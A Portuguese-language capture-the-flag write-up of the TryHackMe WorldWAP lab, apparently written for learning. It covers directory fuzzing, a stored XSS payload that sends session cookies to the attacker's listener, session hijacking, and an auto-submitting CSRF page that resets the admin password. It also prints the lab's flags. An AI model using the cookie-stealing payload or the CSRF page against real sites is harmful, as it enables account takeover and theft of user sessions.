# 🛡️ XSS + Session Hacking na prática  
## Exploração Completa — *WorldWAP.thm (TryHackMe)*

> Autor: @Piceli{DuckWare}

Este documento explica, de forma **profunda porém acessível**, a exploração completa da máquina *WorldWAP.thm* do TryHackMe, utilizando:

- Enumeração de caminhos  
- Análise de API  
- Exploração de **Stored XSS**  
- **Furto de sessão** via JavaScript  
- Sequestro de sessão no navegador  
- Exploração de uma falha do tipo **CSRF-like**  
- Escalada de privilégios para **admin**  
- Extração das flags do desafio  



---

# 📌 Resumo do Ataque

O fluxo geral foi:

1. Descobrir diretórios sensíveis via fuzzing (`/public`, `/api`).  
2. Analisar o fluxo de registro da aplicação.  
3. Descobrir um ponto vulnerável a **Stored XSS**.  
4. Criar um payload que envia o cookie do moderador para nossa máquina.  
5. Capturar o cookie com `nc`.  
6. Substituir manualmente o cookie local para **virar moderador**.  
7. Achar a dica sobre o subdomínio `login.worldwap.thm`.  
8. Encontrar um endpoint de alteração de senha **sem proteção CSRF**.  
9. Criar uma página maliciosa que envia a requisição automaticamente.  
10. Subir um servidor HTTP local e esperar o sistema consumir a página.  
11. Logar como admin e obter a flag final.

---

# 🔍 Etapa 1 — Configurando o ambiente

Adicionar o domínio no `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Adicionar:

```
"IP da VPN"   worldwap.thm
```

Testar:

```bash
ping worldwap.thm
```

---

# 📂 Etapa 2 — Descobrindo diretórios com FFUF

```bash
ffuf -u http://worldwap.thm/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fc 404
```

Resultados importantes:

- `/public`  
- `/api`  
- `/phpmyadmin`

Depois, fuzzing em `/public`:

```bash
ffuf -u http://worldwap.thm/public/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fc 404
```

Encontrado:

- `/public/html/`

---

# 📝 Etapa 3 — Analisando o fluxo de registro

A página de registro envia uma requisição JSON:

```http
POST /api/register.php HTTP/1.1
Host: worldwap.thm
Content-Type: application/json
X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85

{"username":"teste","password":"teste","email":"teste@teste.com","name":"Teste"}
```

⚠ **O campo `name` é injetado diretamente em páginas internas.**  
Isso permite **Stored XSS**.

---

# ☠️ Etapa 4 — Criando o Payload de Stored XSS

Payload:

```html
"><script>document.location='http://192.168.149.204:4444/?c='+document.cookie</script>
```

Requisição maliciosa:

```http
POST /api/register.php HTTP/1.1
Host: worldwap.thm
Content-Type: application/json

{"username":"piceli001","password":"teste","email":"piceli001@teste.com","name":"\"><script>document.location='http://192.168.149.204:4444/?c='+document.cookie</script>"}
```

---

# 🎧 Etapa 5 — Capturando o Cookie com Netcat

```bash
nc -lvnp 4444
```

Resposta recebida:

```
GET /?c=PHPSESSID=5g9s0jg7mkop7ksu1st0pq1pvi HTTP/1.1
```

Esse é o cookie real do moderador.

---

# 🔐 Etapa 6 — Hijacking (Sequestro de Sessão)

Nos Cookies do navegador:

```
Name: PHPSESSID  
Value: 5g9s0jg7mkop7ksu1st0pq1pvi
```

Atualize → agora você é o **moderador**.

Flag exibida no painel:

```
ModP@wnEd
```

E uma mensagem interna:

```
login.worldwap.thm is operational
```

---

# 🌐 Etapa 7 — Adicionando o subdomínio encontrado

```bash
sudo nano /etc/hosts
```

Adicionar:

```
"IP da VM"   login.worldwap.thm
```

Acessar:

```
http://login.worldwap.thm
```

---

# 🧩 Etapa 8 — Investigando o Change Password

O endpoint:

- Não tem CSRF token  
- Não valida origem  
- Aceita um simples POST:

```
newPassword=...
```

Perfeito para ataque.

---

# 🧾 Etapa 9 — Construindo a Página CSRF

Criar:

```bash
nano csrf_admin.html
```

Conteúdo:

```html
<html>
  <body>
    <form action="http://worldwap.thm/api/changePassword.php" method="POST" id="csrf">
      <input type="hidden" name="newPassword" value="Admin123!">
    </form>
    <script>
      document.getElementById('csrf').submit();
    </script>
  </body>
</html>
```

---

# 🌍 Etapa 10 — Subindo servidor Python

```bash
python3 -m http.server 9000
```

Arquivo disponível em:

```
http://SEU_IP:9000/csrf_admin.html
```

Quando acessado internamente → senha alterada.

---

# 👑 Etapa 11 — Logando como admin

Acessar:

```
http://login.worldwap.thm
```

Credenciais:

```
admin  
Admin123!
```

Flag final:

```
AdM!nP@wnEd
```

---

# 📌 Insights Importantes

- Stored XSS é extremamente perigoso.  
- Navegadores enviam cookies automaticamente.  
- Sessões podem ser sequestradas manualmente.  
- Subdomínios escondem áreas administrativas.  
- Falta de CSRF torna endpoints críticos exploráveis.

---

# 🧩 Flags Finais

```
ModP@wnEd  
AdM!nP@wnEd
```

---

# ✅ Conclusão

Este laboratório demonstra como combinar:

- Enumeração  
- XSS armazenado  
- Roubo de cookie  
- Sequestro de sessão  
- Exploração CSRF  
- Escalada para admin  

Ataque completo, realista e extremamente comum em aplicações mal protegidas.


